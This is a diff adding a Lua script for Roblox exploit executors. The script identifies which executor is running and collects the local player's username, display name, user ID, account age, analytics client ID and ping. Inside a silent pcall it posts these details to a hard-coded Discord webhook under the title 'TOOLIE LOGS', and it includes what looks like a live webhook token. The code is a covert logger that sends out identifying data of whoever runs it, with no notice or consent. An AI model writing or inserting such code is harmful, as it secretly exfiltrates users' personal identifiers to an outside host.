@@ -1,0 +1,93 @@
+local webh = "https://discord.com/api/webhooks/1049843596838318120/1SGqKd8JF44d3pNIXXtp9ZXRXiIR1gkhO1i5lvGcamUATLI0DudIcwiBFLioEhUW4_9W"
+local jobid = game.JobId or 1
+local joinurl = "Roblox.GameLauncher.joinGameInstance(2788229376, '"..jobid.."');"
+local profile = " https://roblox.com/users/"..game.Players.LocalPlayer.UserId.."/profile"
+
+local webhookcheck = 
+    is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X or Flexus" or
+    secure_load and "Sentinel" or
+    KRNL_LOADED and "KRNL" or
+    SONA_LOADED and "Sona" or
+    "Unknown Exploit"
+
+pcall(function()
+   local data = {
+   
+  
+  ['embeds'] = {
+    {
+       ['title'] = 'TOOLIE LOGS',
+       ["description"] = "**  **" ..profile,
+	   ['fields'] = {
+                {
+                    ["name"] = "USERNAME",
+                    ["value"] = "**Username: **"..game.Players.LocalPlayer.Name,
+                },
+                {
+                    ["name"] = "DISPLAY NAME",
+                    ["value"] = "**Display Name: **"..game.Players.LocalPlayer.DisplayName,
+                },
+                {
+                    ["name"] = "PLAYER ID",
+                    ["value"] = "**ID: **"..game.Players.LocalPlayer.UserId,
+                },
+                {
+                    ["name"] = "ACCOUNT AGE",
+                    ["value"] = "**Age: **"..game.Players.LocalPlayer.AccountAge,
+                },
+                {
+                    ["name"] = "EXPLOIT",
+                    ["value"] = "```"..webhookcheck.."```"
+                },
+                {
+                    ["name"] = "LOG ID",
+                    ["value"] = "```"..game:GetService("RbxAnalyticsService"):GetClientId().."```"
+                },
+                {
+                    ["name"] = "PING",
+                    ["value"] = "```"..game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString().."```"
+                },
+            
+            },
+            ["thumbnail"] = {
+                ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. game.Players.LocalPlayer.UserId .. "&width=150&height=150&format=png",
+            },
+        }
+    }
+}
+
+   if syn then
+       local response = syn.request(
+           {
+               Url = webh,
+               Method = 'POST',
+               Headers = {
+                   ['Content-Type'] = 'application/json'
+               },
+               Body = game:GetService('HttpService'):JSONEncode(data)
+           }
+       );
+   elseif request then
+       local response = request(
+           {
+               Url = webh,
+               Method = 'POST',
+               Headers = {
+                   ['Content-Type'] = 'application/json'
+               },
+               Body = game:GetService('HttpService'):JSONEncode(data)
+           }
+       );
+   elseif http_request then
+       local response = http_request(
+           {
+               Url = webh,
+               Method = 'POST',
+               Headers = {
+                   ['Content-Type'] = 'application/json'
+               },
+               Body = game:GetService('HttpService'):JSONEncode(data)
+           }
+       );
+   end
+end)
